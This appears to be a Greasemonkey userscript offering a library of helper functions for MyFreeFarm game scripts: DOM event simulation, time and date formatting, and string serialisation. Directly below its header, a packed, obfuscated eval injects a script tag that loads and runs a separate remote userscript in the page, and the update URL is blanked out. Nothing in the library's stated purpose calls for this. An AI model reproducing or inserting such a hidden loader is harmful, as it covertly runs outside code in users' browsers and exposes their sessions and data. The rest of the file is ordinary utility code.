// ==UserScript==
// @name           Common functions for MyFreeFarm-Scripts Pro + Last Update
// @namespace      http://userscripts.org/scripts/show/94946
// @updateURL      about:blank
// @description    Common functions for MyFreeFarm-Scripts
// @date           04.06.2013
// @version        1.0.38
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


const VERSIONfunctionFile = "1.0.38";

// PROTOTYPES ************************************************************************************************************	
String.prototype.reverse = function(){
	splitext = this.split("");
	revertext = splitext.reverse();
	reversed = revertext.join("");
	return reversed;
};
String.prototype.capitalize = function() {
	return this.charAt(0).toUpperCase() + this.slice(1);
};
Array.prototype.shuffle = function (){
	var i=this.length, j, temp;
	if (i==0) return;
	while (--i) {
			j = Math.floor( Math.random()*(i+1));
			temp = this[i];
			this[i] = this[j];
			this[j] = temp;
	}
	temp=null;
};
Array.prototype.swap = function (from, to){
	var temp;
	if (this.length==0) return;
	temp = this[from];
	this[from] = this[to];
	this[to] = temp;
	temp=null;
};
Object.prototype.order = new Array();
Object.prototype.sortObj = function(sortfkt,descending){
	// sortfkt:
	// a[0] accesses the object-key "a", a[1] the containing data "Object[a]"
	// numbers first, then strings : default
	// numbers : function(a,b){return (parseFloat(a[0],10)-parseFloat(b[0],10));}
	// dates - ascending sorting : function(a,b){return (getTime(a[0])-getTime(b[0]));}
	// descending: bool
	
	// Setup helping array
	var sorted = new Array();
	for (var i in this){
		if(!this.hasOwnProperty(i)){ continue; }
		sorted.push([i,this[i]]);
	}
	// Define default sorting function
	if(typeof sortfkt!="function"){
		sortfkt = function(a,b){
			if(isNaN(a[0])){
				if(isNaN(b[0])){ return ((a[0]>b[0])-(a[0]<b[0])); } // both strings
				else { return 1; } // string > number
			} else {
				if(isNaN(b[0])){ return -1; } // number < string
				else { return (a[0]-b[0]); } // both numbers
			}
		};
	}
	// Sorting the helping array
	sorted.sort(sortfkt);
	if(descending){ sorted.reverse(); }

	// Reconstruct sorted object
	this.order.splice(0,this.order.length);
	for(var j=0;j<sorted.length;j++){
		this.order.push(sorted[j][0]);
		// delete this[sorted[j][0]];
		// this[sorted[j][0]] = sorted[j][1];
	}
	sorted=null;
	return this;
};
Object.prototype.isEmpty = function(){
	for(var i in this){
		if(this.hasOwnProperty(i)){ return false; }
	}
	return true;
};
Object.prototype.length = function(){
	var len = 0;
	for (var i in this){
		if(!this.hasOwnProperty(i)){ continue; }
		len++;
	}
	return len;
};
Object.prototype.clone = function () {
try{
	var o = (this instanceof Array)?[]:{};
	for (var property in this) {
		if(!this.hasOwnProperty(property)){ continue; }
		if((this[property]!=null)&&(typeof (this[property])=="object")){
			o[property] = this[property].clone()
		}else{
			o[property] = this[property];
		}
	}
	return o;
}catch(err){ GM_log("ERROR Object.prototype.clone property="+property+"\n"+err); }
};

// FUNCTIONS *************************************************************************************************************	

function GM_setValueCache(a,b){
	window.setTimeout(function(){
		GM_setValue(a,b);
	},0);
}
function GM_setValue2(a,b,debug){
	// for developing / finding security errors, use debug unique for optimal tracking
	GM_setValue(a,b);
	try{
	if(GM_getValue(a)!=b){
		GM_log("GM_setValue2 FAILED a="+a+" debug="+debug);
		GM_setValueCache(a,b);
	}
	}catch(err){
		GM_log("GM_setValue2 ERROR a="+a+" debug="+debug+" err="+err);
		GM_setValueCache(a,b);
	}
}
_GM_log=GM_log;
GM_log=function(txt){
	_GM_log((LNG?LNG.toUpperCase():"")+"-"+(SERVER?SERVER:"")+": "+txt);
};
	
function $(ID){return document.getElementById(ID);}
//function $(ID){GM_log("ID:"+ID);return document.getElementById(ID);}
function $top(ID) {return top.document.getElementById(ID);}
function unsafe$(ID){return unsafeWindow.document.getElementById(ID);}
function unsafe$top(ID) {return top.window.wrappedJSObject.document.getElementById(ID);}
function containerId(node) {
	node = node.parentNode;
	while(node.id==""){
		if(node.parentNode){
			node = node.parentNode; 
		} else {
			GM_log("ERROR in containerId");
			break;
		}
	}
	return node.id;
}
function removeElement(node){
	if(node&&node.parentNode){
		node.parentNode.removeChild(node);
	}
}
function createElement(type, attributes, append, inner){
	var node = document.createElement(type);
	for (var attr in attributes) {
		if (!attributes.hasOwnProperty(attr)){ continue; }
		if (attr=="checked"){ node.checked=attributes[attr]; }
		else { node.setAttribute(attr, attributes[attr]); }
	}
	if (append) append.appendChild(node);
	if (inner) node.innerHTML = inner;
	return node;
}

function raiseEvent(A){
	var B = document.createEvent("Event");
	B.initEvent(A, true, true);
	document.dispatchEvent(B);
}
function raiseEventTop(A){
	// should be called from frame-documents to inform the top-document(main.php)
	// if frame is top itself (=multi-window gaming) it instead saves to variable and do_main will raise the event in the main-window
	if((PAGE!="main")&&(self==top)){
		window.setTimeout(function(){
			if(DEVMODE_EVENTS){ showInLogBubble("raiseEventTop set "+A); }
			var raisedEvents = explode(GM_getValue(LNG+"_"+SERVER+"_"+USERNAME+"_raisedEvents"),"raiseEventTop","{}");
			raisedEvents[A] = PAGE;
			GM_setValue(LNG+"_"+SERVER+"_"+USERNAME+"_raisedEvents",implode(raisedEvents));
		},0);
	} else {
		if(DEVMODE_EVENTS){ showInLogBubble("raiseEventTop "+A); }
		var B = top.document.createEvent("Event");
		B.initEvent(A, true, true);
		top.document.dispatchEvent(B);
	}
}
function raiseDOMAttrModified(A){
 	var B = document.createEvent("MutationEvent");
	B.initEvent("DOMAttrModified", true, true);
	A.dispatchEvent(B);
}

function click(A){
try{
	var B = document.createEvent("MouseEvents");
	B.initEvent("click", true, true);
	A.dispatchEvent(B);
	if(DEVMODE){
		var T = A;
		var str = "";
		while(!T.id){
			T = T.parentNode;
			str += ".child";
		}
		//GM_log("Click :"+T.id+str);
	}
	// if (A.href){ location.href = A.href; }
}catch(err){
	GM_log("ERROR click: "+(A&&A.id?("id="+A.id):("id unknown"))+".\n" + err);
	throw ("ERROR click: "+(A&&A.id?("id="+A.id):("id unknown"))+".\n" + err);
}
}
function dblclick(A){
	var B = document.createEvent("MouseEvents");
	B.initEvent("dblclick", true, true);
	A.dispatchEvent(B);
	// if (A.href){ location.href = A.href; }
}
function mouseover(A){
try{
	var B = document.createEvent("MouseEvents");
	B.initEvent("mouseover", true, true);
	A.dispatchEvent(B);
}catch(err){
	GM_log("ERROR mouseover: "+(A&&A.id?("id="+A.id):("id unknown"))+".\n" + err);
	throw ("ERROR mouseover: "+(A&&A.id?("id="+A.id):("id unknown"))+".\n" + err);
}
}
function keyup(A,keycode,ctrlKeyArg,altKeyArg,shiftKeyArg) {
	if (!keycode) keycode=0;
	var B = document.createEvent("KeyboardEvent");
	B.initKeyEvent(
		"keyup",					//	in DOMString typeArg,
		true,							//	in boolean canBubbleArg,
		true,							//	in boolean cancelableArg,
		null,							//	in nsIDOMAbstractView viewArg,	Specifies UIEvent.view. This value may be null.
		!!ctrlKeyArg,			//	in boolean ctrlKeyArg,
		!!altKeyArg,			//	in boolean altKeyArg,
		!!shiftKeyArg,		//	in boolean shiftKeyArg,
		false,						//	in boolean metaKeyArg,
		keycode,					//	in unsigned long keyCodeArg,
		0);
	A.dispatchEvent(B);
}
function keydown(A,keycode,ctrlKeyArg,altKeyArg,shiftKeyArg){
	if (!keycode) keycode=0;
	var B = document.createEvent("KeyboardEvent");
	B.initKeyEvent(
		"keydown",				//	in DOMString typeArg,
		true,							//	in boolean canBubbleArg,
		true,							//	in boolean cancelableArg,
		null,							//	in nsIDOMAbstractView viewArg,	Specifies UIEvent.view. This value may be null.
		!!ctrlKeyArg,			//	in boolean ctrlKeyArg,
		!!altKeyArg,			//	in boolean altKeyArg,
		!!shiftKeyArg,		//	in boolean shiftKeyArg,
		false,						//	in boolean metaKeyArg,
		keycode,					//	in unsigned long keyCodeArg,
		0);
	A.dispatchEvent(B);
}
function change(A){
	var B = document.createEvent("MouseEvents");
	B.initEvent("change", true, true);
	A.dispatchEvent(B);
}

var timeMeasure = new Object();
function timeMeasureStart(str){
	timeMeasure[str] = (new Date()).getTime();
}
function timeMeasureStop(str){
	if(timeMeasure[str]){
		GM_log("timeMeasure "+str+": "+((new Date()).getTime()-timeMeasure[str])+"ms");
		delete timeMeasure[str];
	}
}

//---------------------------------------------------------------------------------------------------------------------------

function getElementLeft(Elem,toElem) {
	var elem = document.getElementById(Elem);
	xPos = elem.offsetLeft;
	tempEl = elem.offsetParent;
		while (tempEl != toElem.parenNode) {
			xPos += tempEl.offsetLeft;
			tempEl = tempEl.offsetParent;
		}
	return parseInt(xPos,10);
}
function getElementTop(Elem,toElem) {
	var elem = document.getElementById(Elem);
	yPos = elem.offsetTop;
	tempEl = elem.offsetParent;
	while (tempEl != toElem.parenNode) {
			yPos += tempEl.offsetTop;
			tempEl = tempEl.offsetParent;
		}
	return parseInt(yPos,10);
}
function getOffset(el){
		var _x = 0;
		var _y = 0;
		while(el && !isNaN(el.offsetLeft) && !isNaN(el.offsetTop)){
			if(el.style.position){
				_x += el.offsetLeft - el.scrollLeft;
				_y += el.offsetTop - el.scrollTop;
			}
			el = el.offsetParent; //.parentNode
		}
		return { top: _y, left: _x };
}
function insertAfter(newNode, refNode){
	return refNode.nextSibling ? refNode.parentNode.insertBefore(newNode, refNode.nextSibling) : refNode.parentNode.appendChild(newNode);
}

/*
function makeTablebodyScrollable(table,bodyHeight){
	var innerTable = createElement("table",{});
	//insert outer div to shorten the table which could remove additional outer scrollbars
	var newdiv = createElement("div",{"style":"height:"+bodyHeight+";overflow-y:scroll;"});
	table.parentNode.insertBefore(newdiv,table);
	newdiv.appendChild(table);
	//get the computed widths
	var tbody = table.getElementsByTagName("tbody")[0];
	var help = new Array();
	for(var v=0;v<tbody.children[0].childElementCount;v++){
		help[v] = parseInt(window.getComputedStyle(tbody.children[0].children[v]).width,10);
	}
	//set the widths
	GM_log(help)
	newdiv = createElement("colgroup");
	table.insertBefore(newdiv,table.firstElementChild);
	var newdiv1 = createElement("colgroup",{},innerTable);
	for(var v=0;v<help.length;v++){
		createElement("col",{"width":help[v]+"px"},newdiv);
		createElement("col",{"width":help[v]+"px"},newdiv1);
	}
	//create new structure
	newdiv = createElement("tbody");
	tbody = table.replaceChild(newdiv,tbody);
	newdiv = createElement("tr",{},newdiv);
	newdiv = createElement("td",{"colspan":(1+help.length)},newdiv);
	newdiv = createElement("div",{"style":"height:"+bodyHeight+";overflow-y:scroll;"},newdiv);
	newdiv.appendChild(innerTable);	
	innerTable.appendChild(tbody);
	//remove outer div
	table.parentNode.parentNode.replaceChild(table,table.parentNode);
}
*/

//---------------------------------------------------------------------------------------------------------------------------
// TODO name? timeStr, getTimeStr, time2timestr, time2str, 2->To ?
function getTimeStr(time,hideSeconds){ // was int2timestr
	// returns like "1d 12:30:42"
	var str,help;
	if(time<0){ time *= -1; }
	if (hideSeconds) {
		str = timeFormatHM;
	} else {
		str = timeFormatHMS;
		help = time%60;
		str = str.replace("sec",((help<10)?"0":"")+Math.floor(help));
	}
	time=time/60;
	help = time%60;
	str = str.replace("min",((help<10)?"0":"")+Math.floor(help));
	time=time/60;
	help = time%24;
	str = str.replace("hour",((help<10)?"0":"")+Math.floor(help));
	time=time/24;
	if (time>=1){ str=Math.floor(time)+"d&nbsp;"+str; }
	return str;
}
// TODO this includes the call of str2seconds(str)
// TODO name? getTime, timestr2time, str2time, 2->To ?

function getTime(str){ // was timestr2int
	var help1 = null;
	var help = /(\d+):(\d+):(\d+)/.exec(str);
	if(help){
		help1 = [parseInt(help[1],10),parseInt(help[2],10),parseInt(help[3],10)];
		str = str.replace(/(\d+):(\d+):(\d+)/,"");
	} else {
		help = /(\d+):(\d+)/.exec(str);
		if(help){
			help1 = [parseInt(help[1],10),parseInt(help[2],10),0];
			str = str.replace(/(\d+):(\d+)/,"");
		}
	}

	help = /(\d+)\.(\d+)\.(\d+)/.exec(str);
	if(help){
		help[1] = parseInt(help[1],10);
		help[2] = parseInt(help[2],10)-1;
		help[3] = parseInt(help[3],10);
		if(help[3]<100){ help[3] += 2000; }
		help[4] = parseInt(help[4],10);
		help[5] = parseInt(help[5],10);
		if(help1){ return ((new Date(help[3],help[2],help[1],help1[0],help1[1],help1[2])).getTime()/1000); }
		else{ return ((new Date(help[3],help[2],help[1],0,0,0)).getTime()/1000); }
	}
	help = /(\d+)\.(\d+)/.exec(str);
	if(help){
		help[1] = parseInt(help[1],10)-1;
		help[2] = parseInt(help[2],10);
		if(help[2]<100){ help[2] += 2000; }
		if(help1){ return ((new Date(help[2],help[1],1,help1[0],help1[1],help1[2])).getTime()/1000); }
		else{ return ((new Date(help[2],help[1],1,0,0,0)).getTime()/1000); }
	}
	help = /(\d+)/.exec(str);
	if(help){
		help[1] = parseInt(help[1],10);
		if(help[1]<100){ help[1] += 2000; }
		if(help1){ return ((new Date(help[1],0,1,help1[0],help1[1],help1[2])).getTime()/1000); }
		else{ return ((new Date(help[1],0,1,0,0,0)).getTime()/1000); }
	}
	if(help1){ return ((Date.UTC(1970,0,1,help1[0],help1[1],help1[2]))/1000); }
	GM_log("getTime failed at "+str);
	return 0;
}
/*
function getTime(str){ // was timestr2int
	var help = null;
	var help2;
	if(str.match(/\d+\.\d+\.\d+/)){
		if(str.match(/\d+\.\d+\.\d+.*\d+:\d+:\d+/)){
				help = [,,,,,];
				help2 = (/(\d+)\.(\d+)\.(\d+).*(\d+):(\d+):(\d+)/).exec(str);
				help[0] = parseInt(help2[3],10);
				help[1] = parseInt(help2[2],10);
				help[2] = parseInt(help2[1],10);
				help[3] = parseInt(help2[4],10);
				help[4] = parseInt(help2[5],10);
				help[5] = parseInt(help2[6],10);
		} else if(str.match(/\d+:\d+:\d+.*\d+\.\d+\.\d+/)){
				help = [,,,,,];
				help2 = (/(\d+):(\d+):(\d+).*(\d+)\.(\d+)\.(\d+)/).exec(str);
				help[0] = parseInt(help2[6],10);
				help[1] = parseInt(help2[5],10);
				help[2] = parseInt(help2[4],10);
				help[3] = parseInt(help2[1],10);
				help[4] = parseInt(help2[2],10);
				help[5] = parseInt(help2[3],10);
		} else {
			if(str.match(/\d+\.\d+\.\d+.*\d+:\d+/)){
				help = [,,,,,0];
				help2 = (/(\d+)\.(\d+)\.(\d+).*(\d+):(\d+)/).exec(str);
				help[0] = parseInt(help2[3],10);
				help[1] = parseInt(help2[2],10);
				help[2] = parseInt(help2[1],10);
				help[3] = parseInt(help2[4],10);
				help[4] = parseInt(help2[5],10);
			} else if(str.match(/\d+:\d+.*\d+\.\d+\.\d+/)){
				help = [,,,,,0];
				help2 = (/(\d+):(\d+).*(\d+)\.(\d+)\.(\d+)/).exec(str);
				help[0] = parseInt(help2[5],10);
				help[1] = parseInt(help2[4],10);
				help[2] = parseInt(help2[3],10);
				help[3] = parseInt(help2[1],10);
				help[4] = parseInt(help2[2],10);
			} else { 
				help = [,,,0,0,0];
				help2 = (/(\d+)\.(\d+)\.(\d+)/).exec(str);
				help[0] = parseInt(help2[3],10);
				help[1] = parseInt(help2[2],10);
				help[2] = parseInt(help2[1],10);
			}
		}
		if(help){
			if(help[0]<100){ help[0]+=2000; }
			return ((new Date(help[0],help[1]-1,help[2],help[3],help[4],help[5])).getTime()/1000);
		}
	} else {
		if(str.match(/\d+:\d+:\d+/)){
			help = [,,];
			help2 = (/(\d+):(\d+):(\d+)/).exec(str);
			help[0] = parseInt(help2[1],10);
			help[1] = parseInt(help2[2],10);
			help[2] = parseInt(help2[3],10);
		} else if(str.match(/\d+:\d+/)){
			help = [,,0];
			help2 = (/(\d+):(\d+)/).exec(str);
			help[0] = parseInt(help2[1],10);
			help[1] = parseInt(help2[2],10);
		}
		if(help){
			return ((Date.UTC(1970,0,1,help[0],help[1],help[2]))/1000); 
		}
	}
	GM_log("getTime failed at "+str);
	return 0;
}
*/
function getFormattedTime(str){
	var help = null;
	var regDate = dateFormatDMY.replace("day","\\d+").replace("month","\\d+").replace("year","\\d+").replace(/\./g,"\\.");
	var regTime = timeFormatHMS.replace("hour","\\d+").replace("min","\\d+").replace("sec","\\d+").replace(/\./g,"\\.");
	if(str.match(new RegExp(regDate))){
		if(str.match(new RegExp(regDate+".*"+regTime))){
				help = [,,,,,];
				help[0] = parseInt((new RegExp(dateFormatDMY.replace("day","\\d+").replace("month","\\d+").replace("year","(\\d+)").replace("hour","\\d+").replace("min","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[1] = parseInt((new RegExp(dateFormatDMY.replace("day","\\d+").replace("month","(\\d+)").replace("year","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[2] = parseInt((new RegExp(dateFormatDMY.replace("day","(\\d+)").replace("month","\\d+").replace("year","\\d+").replace(".","\\."))).exec(str)[1],10);
				str = str.replace(new RegExp(regDate),"");
				help[3] = parseInt((new RegExp(timeFormatHMS.replace("hour","(\\d+)").replace("min","\\d+").replace("sec","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[4] = parseInt((new RegExp(timeFormatHMS.replace("hour","\\d+").replace("min","(\\d+)").replace("sec","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[5] = parseInt((new RegExp(timeFormatHMS.replace("hour","\\d+").replace("min","\\d+").replace("sec","(\\d+)").replace(".","\\."))).exec(str)[1],10);
		} else if(str.match(new RegExp(regTime+".*"+regDate))){
				help = [,,,,,];
				help[3] = parseInt((new RegExp(timeFormatHMS.replace("hour","(\\d+)").replace("min","\\d+").replace("sec","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[4] = parseInt((new RegExp(timeFormatHMS.replace("hour","\\d+").replace("min","(\\d+)").replace("sec","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[5] = parseInt((new RegExp(timeFormatHMS.replace("hour","\\d+").replace("min","\\d+").replace("sec","(\\d+)").replace(".","\\."))).exec(str)[1],10);
				str = str.replace(new RegExp(regTime),"");
				help[0] = parseInt((new RegExp(dateFormatDMY.replace("day","\\d+").replace("month","\\d+").replace("year","(\\d+)").replace("hour","\\d+").replace("min","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[1] = parseInt((new RegExp(dateFormatDMY.replace("day","\\d+").replace("month","(\\d+)").replace("year","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[2] = parseInt((new RegExp(dateFormatDMY.replace("day","(\\d+)").replace("month","\\d+").replace("year","\\d+").replace(".","\\."))).exec(str)[1],10);
		} else {
			regTime = timeFormatHM.replace("hour","\\d+").replace("min","\\d+").replace(".","\\.");
			if(str.match(new RegExp(regDate+".*"+regTime))){
				help = [,,,,,0];
				help[0] = parseInt((new RegExp(dateFormatDMY.replace("day","\\d+").replace("month","\\d+").replace("year","(\\d+)").replace("hour","\\d+").replace("min","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[1] = parseInt((new RegExp(dateFormatDMY.replace("day","\\d+").replace("month","(\\d+)").replace("year","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[2] = parseInt((new RegExp(dateFormatDMY.replace("day","(\\d+)").replace("month","\\d+").replace("year","\\d+").replace(".","\\."))).exec(str)[1],10);
				str = str.replace(new RegExp(regDate),"");
				help[3] = parseInt((new RegExp(timeFormatHM.replace("hour","(\\d+)").replace("min","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[4] = parseInt((new RegExp(timeFormatHM.replace("hour","\\d+").replace("min","(\\d+)").replace(".","\\."))).exec(str)[1],10);
			} else if(str.match(new RegExp(regTime+".*"+regDate))){
				help = [,,,,,0];
				help[3] = parseInt((new RegExp(timeFormatHM.replace("hour","(\\d+)").replace("min","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[4] = parseInt((new RegExp(timeFormatHM.replace("hour","\\d+").replace("min","(\\d+)").replace(".","\\."))).exec(str)[1],10);
				str = str.replace(new RegExp(regTime),"");
				help[0] = parseInt((new RegExp(dateFormatDMY.replace("day","\\d+").replace("month","\\d+").replace("year","(\\d+)").replace("hour","\\d+").replace("min","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[1] = parseInt((new RegExp(dateFormatDMY.replace("day","\\d+").replace("month","(\\d+)").replace("year","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[2] = parseInt((new RegExp(dateFormatDMY.replace("day","(\\d+)").replace("month","\\d+").replace("year","\\d+").replace(".","\\."))).exec(str)[1],10);
			} else { 
				help = [,,,0,0,0];
				help[0] = parseInt((new RegExp(dateFormatDMY.replace("day","\\d+").replace("month","\\d+").replace("year","(\\d+)").replace("hour","\\d+").replace("min","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[1] = parseInt((new RegExp(dateFormatDMY.replace("day","\\d+").replace("month","(\\d+)").replace("year","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[2] = parseInt((new RegExp(dateFormatDMY.replace("day","(\\d+)").replace("month","\\d+").replace("year","\\d+").replace(".","\\."))).exec(str)[1],10);
			}
		}
		if(help){
			if(help[0]<100){ help[0]+=2000; }
			return ((new Date(help[0],help[1]-1,help[2],help[3],help[4],help[5])).getTime()/1000);
		}
	} else {
		if(str.match(new RegExp(regTime))){
			help = [,,];
			help[0] = parseInt((new RegExp(timeFormatHMS.replace("hour","(\\d+)").replace("min","\\d+").replace("sec","\\d+").replace(".","\\."))).exec(str)[1],10);
			help[1] = parseInt((new RegExp(timeFormatHMS.replace("hour","\\d+").replace("min","(\\d+)").replace("sec","\\d+").replace(".","\\."))).exec(str)[1],10);
			help[2] = parseInt((new RegExp(timeFormatHMS.replace("hour","\\d+").replace("min","\\d+").replace("sec","(\\d+)").replace(".","\\."))).exec(str)[1],10);
		} else {
			regTime = timeFormatHM.replace("hour","\\d+").replace("min","\\d+").replace(".","\\.");
			if(str.match(new RegExp(regTime))){
				help = [,,0];
				help[0] = parseInt((new RegExp(timeFormatHM.replace("hour","(\\d+)").replace("min","\\d+").replace(".","\\."))).exec(str)[1],10);
				help[1] = parseInt((new RegExp(timeFormatHM.replace("hour","\\d+").replace("min","(\\d+)").replace(".","\\."))).exec(str)[1],10);
			}
		}
		if(help){
			return ((Date.UTC(1970,0,1,help[0],help[1],help[2]))/1000); 
		}
	}
	GM_log("getFormattedTime failed at "+str);
	return 0;
}
//TODO name? getDaytime, time2daytime
function getDaytimeStr(time,hideSeconds,paddHours){ // was uhrzeit
	//GM_log("getDaytimeStr: " + time);
	var time2 = new Date(time*1000);
	var str,help;
	if (hideSeconds) {
		str = timeFormatHM;
	} else {
		str = timeFormatHMS;
		help = time2.getSeconds();
		str = str.replace("sec",((help<10)?"0":"")+Math.floor(help));
	}
	help = time2.getMinutes();
	str = str.replace("min",((help<10)?"0":"")+Math.floor(help));
	help = time2.getHours();
	str = str.replace("hour",((!!paddHours && help<10)?"0":"")+Math.floor(help));
	return str;
}
/*
function getDateStr(time,hideyear){	//TODO CHANGED THE ARGUMENTS
	var time2 = new Date(time*1000);
	str="";
	if (time2.getDate()<10) { str += "0"; }
	str += time2.getDate() +".";
	if (time2.getMonth()<9) { str += "0"; }
	str += (1+time2.getMonth())+".";
	if (!hideyear) str += (time2.getFullYear());
	return str;
}
*/
//TODO name? getDate, time2date
function getDateStr(time,yearformat,padd){ //in seconds //was datum
	// yearformat:
	// 0 -> 01.02.
	// 1 -> 01.02.11
	// 2 -> 01.02.2011 (default)
	// padd:
	// true -> 01.02.2011 (default)
	// false -> 1.2.2011
	if(typeof yearformat!="number"){ yearformat = 2; }
	if(typeof padd!="boolean"){ padd = true; }

	var time2 = new Date(time*1000);
	var str,help;
	switch(yearformat){
		case 0: str = "day.month"; break;
		case 1: str = ("day.month.year").replace("year",time2.getFullYear().toString().slice(-2)); break;
		case 2: str = ("day.month.year").replace("year",time2.getFullYear()); break;
	}	
	help = time2.getDate();
	str = str.replace("day",((padd&&help<10)?"0":"")+help);
	help = 1+time2.getMonth();
	str = str.replace("month",((padd&&help<10)?"0":"")+help);
	return str;
}
function getFormattedDateStr(time,yearformat,padd){
	// yearformat:
	// 0 -> 01.02.
	// 1 -> 01.02.11
	// 2 -> 01.02.2011 (default)
	// padd:
	// true -> 01.02.2011 (default)
	// false -> 1.2.2011
	if(typeof yearformat!="number"){ yearformat = 2; }
	if(typeof padd!="boolean"){ padd = true; }

	var time2 = new Date(time*1000);
	var str,help;
	switch(yearformat){
		case 0: str = dateFormatDM; break;
		case 1: str = dateFormatDMY.replace("year",time2.getFullYear().toString().slice(-2)); break;
		case 2: str = dateFormatDMY.replace("year",time2.getFullYear()); break;
	}	
	help = time2.getDate();
	str = str.replace("day",((padd&&help<10)?"0":"")+help);
	help = 1+time2.getMonth();
	str = str.replace("month",((padd&&help<10)?"0":"")+help);
	return str;
}
//TODO name? getDateText
function getDateText(time,yearformat){ // was datumDay
	var time2 = Math.floor(time);
	var today = new Date(new Date().getFullYear(), new Date().getMonth(),new Date().getDate(),0,0,0)/1000; //begin of this day.
	//GM_log ("timer :" + time2 + " : " + today);
	if (time2 < today){
		return getFormattedDateStr(time,yearformat);
	} else if (time2 < (today+(1*24*60*60))){
		return texte["day0"];
	} else if (texte["day1"] && (time2 < (today+(2*24*60*60)))){
		return texte["day1"];
	} else if (texte["day2"] && (time2 < (today+(3*24*60*60)))){
		return texte["day2"];
	} else {
		return getFormattedDateStr(time,yearformat);
	}
}
function countDays(time1,time2){ //in seconds
	// returns number of days from 1 to 2. for example 0 if both on one day.
	// calculate times of midnight
	time1 = new Date(Math.round(time1*1000));
	time1 = ((new Date(time1.getFullYear(),time1.getMonth(),time1.getDate())).getTime())/1000;
	time2 = new Date(Math.round(time2*1000));
	time2 = ((new Date(time2.getFullYear(),time2.getMonth(),time2.getDate())).getTime())/1000;
	return Math.round((time2-time1)/86400);
}
//---------------------------------------------------------------------------------------------------------------------------
function explode(str,debugName,defaultReturn,depth){
	//GM_log("Begin explode "+ str);
	if(debugName==undefined){
		debugName = ""; 
		GM_log("WARNING Explode. DebugName not set. Argument:" + str);
	}else if(typeof defaultReturn==undefined){
		GM_log("WARNING Explode "+debugName+". defaultReturn not set.");
	}
	try{	
		if(str==undefined){ 
			throw ("Argument is undefined."); 
		}
		if(typeof str != "number" && typeof str != "string"){
			throw ("Argument is not a string nor a number."); 
		}
//	if(str==""){ return undefined; }
		var help = eval('(' + str + ')');
		// if(defaultReturn==undefined){
			return help;
		// }
	}catch(err){
		if((typeof defaultReturn=="boolean")&&(!defaultReturn)){
			GM_log("ERROR explode "+debugName+". no defaultReturn.\n" + err);
			throw ("Explode error "+debugName+". no defaultReturn.\n" + err);
		}else if(typeof defaultReturn==undefined){
			GM_log("ERROR explode "+debugName+". defaultReturn=" + implode(defaultReturn)+" \n" + err);
			throw ("Explode error "+debugName+". defaultReturn=" + implode(defaultReturn)+" \n" + err);
		} else {
			GM_log("WARNING explode "+debugName+". returns given default. Argument=" + str+" \n" + err);
			return defaultReturn;
		}
	}
	/*
	try{
		function recusiveCheck(h,d,lvl,dpth){
			var i, correct=true;
			for(var i in d){
				if(!d.hasOwnProperty(i)){continue;}
				if(!((typeof h[i])==(typeof d[i]))||!((h[i] instanceof Array)==(d[i] instanceof Array))){
					return false;
				}
				if(typeof d[i]=="object" && lvl<dpth && !recusiveControl(h[i],d[i],lvl+1,dpth)){
					return false;
				}
			}
			return correct;
		}
		var correct=false;
		if(((typeof help)==(typeof defaultReturn))&&((help instanceof Array)==(defaultReturn instanceof Array))){
			correct=true;
			if(!isNaN(depth)&&depth>1&&!recusiveCheck(help,defaultReturn,0,depth)){
				correct=false;
			}
		}
		if(correct){
			return help;
		}else{
			GM_log("WARNING Explode "+debugName+". incorrect structure compairing. returns given default. Argument:" + str+" \n");
			return defaultReturn;
		}
	}catch(err){
		GM_log("WARNING Explode "+debugName+". error while compairing. \n" + err);
		return help;
	}
	*/
}
function implode(arr,debugName){
	try{
		if(debugName==undefined){
			debugName = ""; 
			// GM_log("WARNING implode. DebugName not set. Argument:" + arr);
		}
		var line = new String();
		var InternalCounter = -1;
		var NoKey = new Boolean(false);
		if (arr == undefined){ return ""; }
		if (typeof arr == "function"){ return "function"; }
		if (typeof arr == "string"){ return arr; }
		if (typeof arr == "boolean"){ return arr.toString(); }
		if (typeof arr == "number"){ return arr.toString(); }
		if (typeof arr != "object"){ throw("Argument is not an Object or Array. Type is " + typeof arr +".\n"); }
		var type = (arr instanceof Array); //true->array | false->object

		line = (type)?"[":"{";
		for(var i in arr ){
			try{
				if(!arr.hasOwnProperty(i)){continue;}
				InternalCounter++;
				if (type){
					while (i>InternalCounter){
						line += ",";
						InternalCounter++;
					}
				}else{
					line += "\"" + i + "\":";
				}
				if (typeof arr[i] == "number" || typeof arr[i] == "boolean"){
					line += arr[i];
				} else if (typeof arr[i] == "string"){
					line += "\"" + arr[i].replace(/\\/g,"\\\\").replace(/\"/g,"\\\"") + "\"";
				} else if(typeof arr[i] == "undefined"){
					line += 'undefined';
				} else if(arr[i]==null){
					line += 'null';
				} else {
					line += implode(arr[i],debugName);
				}
				line += ",";
			}catch(err){
				GM_log("ERROR: implode "+debugName+" i="+i+"\n"+err);
				continue;
			}
		}
		var endChar = line.substring(line.length-1,line.length);
		return line.substring(0,line.length-1) + (("{[".indexOf(endChar)!=-1)? endChar:"")+ ((type)?"]":"}");
	} catch (err){
		GM_log("ERROR implode "+debugName+"\n" + err);
		throw ("ERROR implode "+debugName+"\n" + err);
	}
}
function enc(str,sh) {
	var encoded = "";
	for (i=0; i<str.length;i++) {
		encoded = encoded+String.fromCharCode(str.charCodeAt(i)+sh);
	}
	return encoded;
}
function print_r(arr,line,showType,linebreak){
	var str = new String();
	if (!line){ line=""; }
